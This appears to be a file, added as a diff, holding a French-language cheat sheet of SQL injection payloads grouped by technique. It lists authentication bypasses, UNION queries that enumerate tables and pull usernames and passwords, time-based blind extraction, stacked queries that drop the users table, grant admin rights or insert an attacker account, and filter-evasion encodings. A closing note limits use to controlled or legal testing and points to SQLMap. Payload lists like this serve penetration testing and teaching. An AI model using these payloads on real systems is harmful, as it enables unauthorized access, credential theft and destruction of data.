@@ -1,0 +1,138 @@
+Injection simple : Contourne l'authentification en utilisant un commentaire pour ignorer le reste de la requête SQL.
+' OR 1=1 --
+
+Injection avec une condition vérifiée : Injecte directement le nom d'utilisateur "admin" et ignore le reste avec un commentaire.
+admin' --
+
+Injection conditionnelle élargie : Ajoute une condition toujours vraie (OR 1=1) pour forcer l'accès.
+admin' OR 1=1 --
+
+Injection basée sur un commentaire : Utilise # comme syntaxe de commentaire pour ignorer la partie restante de la requête.
+admin' OR 1=1 #
+
+Injection avec fermeture correcte de la requête : Tente une correspondance stricte tout en fermant correctement la requête SQL.
+admin' AND '1'='1
+
+Injection directe avec valeur fixe : Injecte le nom d'utilisateur sans vérification supplémentaire.
+admin' --
+
+________________________________________________________________________________
+Liste de payloads SQL Injection plus complexes que vous pouvez tester pour divers scénarios d'injection SQL, classés par type d'attaque :
+
+1. Authentification Bypass
+Ces payloads contournent l'authentification en exploitant des failles dans la requête SQL :
+
+' OR '1'='1' --
+' OR '1'='1' #
+' OR 1=1 --
+' OR 1=1 #
+') OR ('1'='1
+' OR '1'='1' AND ''='
+admin' --
+admin' #
+________________________________________________________________________________
+
+2. Exploitation de colonnes et tables
+Pour extraire des données sensibles telles que les noms de colonnes ou les tables, ces payloads sont souvent utilisés :
+
+Enumération des colonnes :
+
+' UNION SELECT 1,2,3 --
+' UNION SELECT null, table_name FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+
+Enumération des tables :
+
+' UNION SELECT table_name, column_name FROM information_schema.columns --
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --
+________________________________________________________________________________
+3. Exfiltration de données
+Ces payloads extraient directement des données sensibles comme les noms d'utilisateur et les mots de passe :
+
+
+' UNION SELECT username, password FROM users --
+' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --
+________________________________________________________________________________
+
+4. Injections basées sur le temps (Blind SQL Injection)
+Ces payloads exploitent des réponses retardées pour tester des conditions lorsque la réponse n'est pas affichée directement.
+
+Tests de base :
+
+' OR IF(1=1, SLEEP(5), 0) --
+' AND IF(LENGTH(database())>5, SLEEP(5), 0) --
+
+Extraire des informations une lettre à la fois :
+
+' AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0) --
+' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 100 --
+________________________________________________________________________________
+
+5. Attaques de type "Stacked Queries"
+Ces payloads exécutent plusieurs requêtes SQL dans une seule injection (si supporté par le système) :
+
+'; DROP TABLE users; --
+'; UPDATE users SET is_admin=1 WHERE username='admin'; --
+'; INSERT INTO users (username, password) VALUES ('hacker', '1234'); --
+
+________________________________________________________________________________
+6. Détection et contournement des pare-feux
+Contourner les filtres avec encodage :
+
+%27%20OR%20%271%27=%271 --
+%27%20UNION%20SELECT%20null,null,null --
+
+Utilisation des commentaires inline :
+
+admin'/**/OR/**/'1'='1'--
+' OR '1'='1'/**/AND/**/'a'='a --
+
+________________________________________________________________________________
+7. Exploitation de champs numériques
+
+Si le champ d'injection accepte uniquement des nombres :
+
+1 OR 1=1 --
+1 AND 1=2 UNION SELECT 1, database() --
+1 UNION SELECT null, user() --
+________________________________________________________________________________
+
+8. Détection de la version du serveur
+Ces payloads permettent de détecter le système de gestion de bases de données utilisé (MySQL, PostgreSQL, etc.) :
+
+
+' UNION SELECT @@version --
+' UNION SELECT version() --
+' UNION SELECT @@hostname --
+________________________________________________________________________________
+
+9. Attaques sur XML/JSON dans SQL (Exploitation avancée)
+Avec données JSON :
+
+' AND JSON_CONTAINS('[1,2,3]', '2') --
+
+Avec données XML :
+
+' UNION SELECT ExtractValue(xml_data, '//user/name') FROM users --
+
+________________________________________________________________________________
+
+10. Autres payloads avancés
+
+Dump complet d'une base de données :
+
+' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --
+
+Injection conditionnelle :
+
+' OR IF((SELECT COUNT(*) FROM users WHERE is_admin=1)>0, SLEEP(5), 0) --
+
+Identification des permissions :
+
+' UNION SELECT user(), current_user(), session_user() --
+________________________________________________________________________________
+Précautions :
+Ces payloads sont à utiliser uniquement dans des environnements contrôlés à des fins d'apprentissage ou de tests légaux.
+
+Utilisez des outils comme SQLMap pour automatiser certaines attaques complexes.
+
